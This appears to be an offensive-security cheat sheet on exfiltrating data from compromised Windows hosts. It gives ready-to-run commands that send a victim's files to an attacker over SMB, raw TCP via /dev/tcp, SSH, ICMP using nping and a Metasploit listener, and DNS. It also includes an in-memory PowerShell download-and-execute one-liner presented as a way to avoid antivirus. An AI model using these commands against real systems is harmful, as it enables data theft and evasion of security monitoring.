---
title: Windows data exfiltrator notes
---

- [1. Simple file transfer](#1-simple-file-transfer)
  - [1.1. SMB (two ways)](#11-smb-two-ways)
  - [1.2. Evil-WinRM (two ways)](#12-evil-winrm-two-ways)
  - [1.3. HTTP (attacker -\> victim)](#13-http-attacker---victim)
- [2. TCP socket](#2-tcp-socket)
- [3. SSH protocol](#3-ssh-protocol)
- [4. HTTP(S) protocol](#4-https-protocol)
- [5. ICMP](#5-icmp)
- [6. DNS](#6-dns)

## 1. Simple file transfer

[Great post about Windows file transfers for hackers](https://juggernaut-sec.com/windows-file-transfers-for-hackers/).

### 1.1. SMB (two ways)
Using local SMB server (running on the attacker's OS) an attacker is able transfer files in both ways:

```bash
# Run SMB server
impacket-smbserver -smb2support -username <username> -password <password> <share-name> <share-path>
```

```powershell
# Transfer file from the victim to the attacker
copy <local-file> \\<attacker-ip>\<share>\

# Transfer file from the attacker to the victim
copy \\<attacker-ip>\<share>\<file> <local-path>
```

### 1.2. Evil-WinRM (two ways)
The `evil-winrm` tool is able to perform file transfer out of the box if only session is established.

```bash
> download <file>
> send <file>
```

### 1.3. HTTP (attacker -> victim)
Attacker:

```bash
python -m http.server <PORT>
```

Victim:

```powershell
# Download and save
Invoke-WebRequest <URL> -OutFile <FILE>
```

There's a method to download a PS script and run it without touching the disk (directly from memory). It's used to avoid antiviruses and so on.

```powershell
iex (NEw-Object New.WebClient).DownloadString("<URL_TO_SCRIPT.ps1>")
```

## 2. TCP socket
This kind of exfiltration is not recommended in a well-secured environments. Non-standard TCP protocol can be detected easily.

Listener (attacker):

```bash
# Receive data and save to file
nc -lvnp <PORT> > /path/to/file

# Decode and decompress data
dd conv=ascii if=<FILE> | base64 -d > file.tar
tar xvf file.tar
```

Sender (victim):

```bash
# Send compressed and encoded data
tar zcf - <DIR> | base64 | dd conv=ebcdic > /dev/tcp/<IP>/<PORT>
```

## 3. SSH protocol
SSH establishes a secure channel because all transmitted data is encrypted. It's not possible to sniff the unencrypted content.

Sender (victim):

```bash
# Send a file via ssh
tar cf - <DIR> | ssh <HOST> "cd /tmp/; tar xpf -"
```

## 4. HTTP(S) protocol
Exfiltration data through the HTTP protocol is one of the best options because it is hard to distinguish between legitimate and malicious HTTP traffic. Additionally, a POST request data is not stored in log files, cache or any other history.

## 5. ICMP
ICMP packet has optional `data` field where the sensitive data can be stored and transmitted.

Listener (attacker): `Metasploit` framework has built-in module to capture malicious ICMP sequence.

```bash
> use auxiliary/server/icmp_exfil
# Omit outgoing ICMP packets
> set BPF_FILTER icmp and not src <ATTACKER_IP>
> set INTERFACE eth0
> run
```

Sender (victim): we can use the `nping` tool which part of the Nmap package. The ICMP data sequence for the Nmap listener is initialized sending the `BOF<filename>` string.

```bash
# Initialize the ICMP sequence
sudo nping --icmp -c 1 <ATTACKER_IP> --data-string "BOFfile.txt"
# Send data
sudo nping --icmp -c 1 <ATTACKER_IP> --data-string "<DATA>"
# End of the sequence
sudo nping --icmp -c 1 <ATTACKER_IP> --data-string "EOF"
```

## 6. DNS
DNS is not a transport protocol and it's basis of the entire internet so it's not usually monitored. Fully Qualified Domain Name (FQDN) can be at most 255 characters long (including `.` separators). The subdomain part must not exceed 63 characters. The trick is to transfer data using the subdomain part to the controlled (malicious) DNS server.

On the malicious DNS server capture any incoming UDP/53 packet:

```bash
tcpdump -i eth0 udp port 53 -v
```
